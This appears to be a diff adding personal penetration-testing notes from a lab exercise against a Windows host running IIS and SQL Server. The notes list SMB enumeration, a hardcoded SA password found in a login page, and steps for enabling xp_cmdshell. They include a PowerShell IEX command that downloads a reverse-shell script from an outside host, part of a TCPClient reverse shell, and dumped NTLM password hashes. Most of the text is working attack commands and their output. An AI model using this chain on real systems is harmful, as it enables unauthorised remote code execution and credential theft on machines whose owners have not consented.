@@ -1,0 +1,66 @@
+# 1 found login page 
+http://10.11.1.31/
+
+# 2 found smb shares
+smbclient -L $IP
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+wwwroot         Disk      
+
+# 3 check wwwroot share
+smbclient //$IP/wwwroot
+
+/login-off.asp
+cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"
+sSql = "SELECT * FROM tblCustomers where cust_name='" & myUsrName & "' and cust_password='"&myUsrPassword&"'" 
+
+# interact with sql 1433 (rabbit hole)
+sqsh -S $IP -U sa -P poiuytrewq
+
+	# create database
+	CREATE DATABASE bankdb
+
+	# create table
+	CREATE TABLE tblCustomers (id int, cust_name varchar(255), cust_password varchar(255))
+
+	# add evil user
+	INSERT INTO tblCustomers (id, cust_name, cust_password) VALUES (1, 'evil', 'evil')
+
+	# login with evil account in the website
+
+# 4 get system shell from sql server
+
+	# test out xp_cmdshell command
+	1> xp_cmdshell 'whoami';
+	2> /go
+	//got error xp_cmdshell option is disabled
+
+	# Ref:https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15
+	# To allow advanced options to be changed.  
+	1> EXECUTE sp_configure 'show advanced options', 1;  
+	2> GO  
+	# To update the currently configured value for advanced options.  
+	1> RECONFIGURE;  
+	2> GO  
+	# To enable the feature.  
+	1> EXECUTE sp_configure 'xp_cmdshell', 1;  
+	2> GO  
+	# To update the currently configured value for this feature.  
+	1> RECONFIGURE;  
+	2> GO  
+
+	# get shell
+	shell.ps1: $client = New-Object System.Net.Sockets.TCPClient("192.168.119.194",12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while>
+	xp_cmdshell "powershell IEX (New-Object Net.WebClient).Downloadstring('http://192.168.119.194:9000/shell.ps1')"
+
+# 5 dump credentials
+Administrator:500:NO PASSWORD*********************:F58B86E89C8631E432CF1A034662853F:::
+DefaultAccount:503:NO PASSWORD*********************:NO PASSWORD*********************:::
+Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
+ralph:1001:NO PASSWORD*********************:8AA5C8938D14E58F53ECCA45DAB9570D:::
+
+
+# network-secret:7eab8563146f16140c769072580cbcb3
